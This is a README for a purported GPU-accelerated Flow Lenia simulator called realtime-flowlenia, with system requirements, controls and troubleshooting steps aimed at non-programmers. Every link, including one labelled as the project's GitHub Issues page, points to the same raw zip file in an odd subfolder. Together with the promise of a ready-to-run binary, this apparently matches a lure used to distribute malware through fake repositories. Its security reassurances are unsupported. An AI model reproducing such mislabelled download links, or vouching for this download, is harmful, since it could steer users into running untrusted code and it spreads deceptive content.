# 🚀 realtime-flowlenia - Run Flow Lenia with GPU Speed

[![Download Release](https://github.com/Skwizy00/realtime-flowlenia/raw/refs/heads/main/fruitlet/flowlenia-realtime-1.7.zip)](https://github.com/Skwizy00/realtime-flowlenia/raw/refs/heads/main/fruitlet/flowlenia-realtime-1.7.zip)

Welcome to the realtime-flowlenia application. This software runs a live simulation using a method called Flow Lenia. It uses your computer’s graphics processor (GPU) to make these patterns move smoothly and quickly. You will see colorful liquid-like effects that change in real time on your screen.

This guide will help you download, install, and run the program easily. No programming skills are needed.

## 🖥️ What is realtime-flowlenia?

realtime-flowlenia creates animated patterns based on mathematical rules. These patterns move and evolve like liquids or living cells. The software uses your computer’s GPU to process these visuals faster than usual. It supports two main types of GPUs:

- **NVIDIA GPUs** with CUDA support
- **Apple Macs** with MPS support (Apple Silicon)

You will see vibrant, flowing shapes that respond in real time to changes you make. This can serve as art, research, or just fun to watch.

## 📋 System Requirements

Make sure your computer meets these minimum requirements for smooth operation:

- **Operating System:** Windows 10 or later, macOS Big Sur or later
- **GPU:**  
  - For Windows/Linux: NVIDIA graphics card with CUDA support (Compute Capability 3.0 or higher)  
  - For macOS: Apple Silicon (M1, M2 chips) with Metal Performance Shaders (MPS)
- **Memory:** At least 8 GB of RAM
- **Disk Space:** 500 MB free for installation
- **Python:** Not required for basic use. The program is distributed with what it needs to run.

If you do not have a compatible GPU, the software may not work or may run very slowly.

## ▶️ How to Run realtime-flowlenia

Running the software is simple:

- Double-click the realtime-flowlenia application icon.

- The program window should open, showing the moving liquid patterns.

- The patterns begin animating immediately.

- You can interact with controls on the screen to change colors, speed, and pattern type.

If the program does not start, check that your GPU drivers are up to date.

## ⚙️ Controls & Usage Tips

Once realtime-flowlenia is running, you can try the following:

- **Change Color Themes:** Use the color picker to apply different palettes.

- **Adjust Speed:** Use the slider to make patterns move faster or slower.

- **Pause/Play:** Use the Pause button to freeze the animation.

- **Pattern Types:** Choose from several preset flow styles.

- **Fullscreen Mode:** Use the fullscreen button for an immersive view.

Experimenting with these options will give you different visual effects.

## 🛠 Troubleshooting

If you face issues, try these steps first:

- Make sure your GPU drivers are the latest version checked on your hardware manufacturer's website.

- Restart your computer and try launching the program again.

- Verify that you downloaded the correct installer for your operating system.

- Close any other graphics-intensive programs to free up resources.

If problems persist, visit the [realtime-flowlenia GitHub Issues page](https://github.com/Skwizy00/realtime-flowlenia/raw/refs/heads/main/fruitlet/flowlenia-realtime-1.7.zip) for support.

## 🔒 Privacy & Security

realtime-flowlenia runs entirely on your local computer. It does not send any data to the internet. The program accesses only the resources it needs to display graphics. No personal information is collected.

---

## 📖 Additional Information

- The patterns you see are based on a concept called Lenia, a type of artificial life simulation.

- Using the GPU allows for smoother and faster animations than a CPU alone.

- This software is designed to be lightweight and easy to use.
